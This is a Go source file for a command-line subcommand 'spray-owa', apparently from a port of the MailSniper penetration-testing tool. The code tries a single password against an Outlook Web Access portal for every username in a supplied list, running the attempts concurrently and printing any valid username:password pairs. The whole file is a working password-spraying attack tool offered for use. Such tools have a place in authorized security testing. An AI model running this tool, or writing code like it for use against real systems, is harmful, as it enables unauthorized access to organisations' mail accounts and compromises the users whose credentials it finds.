package cmd

import (
	"fmt"
	"sync"
	"time"

	"github.com/spf13/cobra"
	"mailsniper-go/internal/output"
	owaClient "mailsniper-go/internal/owa"
)

func newSprayOWACmd() *cobra.Command {
	var (
		hostname string
		userList string
		password string
		threads  int
		outFile  string
		outFmt   string
		skipTLS  bool
		delay    int
	)

	cmd := &cobra.Command{
		Use:   "spray-owa",
		Short: "Password spray against OWA (Invoke-PasswordSprayOWA)",
		Long: `Attempts to authenticate to an OWA portal using a list of usernames
and a single password. Supports concurrent threads.

Equivalent to the PowerShell Invoke-PasswordSprayOWA function.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			users, err := readLines(userList)
			if err != nil {
				return fmt.Errorf("read user list: %w", err)
			}
			fmt.Printf("[*] Loaded %d users from %s\n", len(users), userList)
			fmt.Printf("[*] Spraying OWA at %s with password: %s\n", hostname, password)
			fmt.Printf("[*] Threads: %d | Delay: %dms\n", threads, delay)

			type result struct {
				user  string
				valid bool
				err   error
			}

			sem := make(chan struct{}, threads)
			resultCh := make(chan result, len(users))
			var wg sync.WaitGroup

			for _, user := range users {
				user := user
				wg.Add(1)
				sem <- struct{}{}
				go func() {
					defer wg.Done()
					defer func() { <-sem }()
					if delay > 0 {
						time.Sleep(time.Duration(delay) * time.Millisecond)
					}
					oc, err := owaClient.NewClient(hostname, skipTLS)
					if err != nil {
						resultCh <- result{user, false, err}
						return
					}
					ok, err := oc.TryLogin(user, password)
					resultCh <- result{user, ok, err}
				}()
			}
			wg.Wait()
			close(resultCh)

			var sprayResults []output.SprayResult
			for r := range resultCh {
				if r.err != nil {
					fmt.Printf("[-] %s: error: %v\n", r.user, r.err)
				} else if r.valid {
					fmt.Printf("[+] VALID: %s:%s\n", r.user, password)
				}
				sprayResults = append(sprayResults, output.SprayResult{
					Username: r.user,
					Password: password,
					Valid:    r.valid,
				})
			}

			if outFile != "" {
				fmt.Printf("[*] Writing results to %s\n", outFile)
				if err := output.WriteSprayResults(outFile, output.ParseFormat(outFmt), sprayResults); err != nil {
					return fmt.Errorf("write results: %w", err)
				}
			}
			return nil
		},
	}

	f := cmd.Flags()
	f.StringVar(&hostname, "hostname", "", "OWA server hostname")
	f.StringVar(&userList, "user-list", "", "File with usernames (one per line)")
	f.StringVar(&password, "password", "", "Password to spray")
	f.IntVar(&threads, "threads", 5, "Number of concurrent threads")
	f.StringVar(&outFile, "output", "", "Output file path")
	f.StringVar(&outFmt, "output-format", "txt", "Output format: csv, json, txt")
	f.BoolVar(&skipTLS, "skip-tls", false, "Skip TLS certificate verification")
	f.IntVar(&delay, "delay", 0, "Delay between requests per thread (milliseconds)")

	_ = cmd.MarkFlagRequired("hostname")
	_ = cmd.MarkFlagRequired("user-list")
	_ = cmd.MarkFlagRequired("password")
	return cmd
}
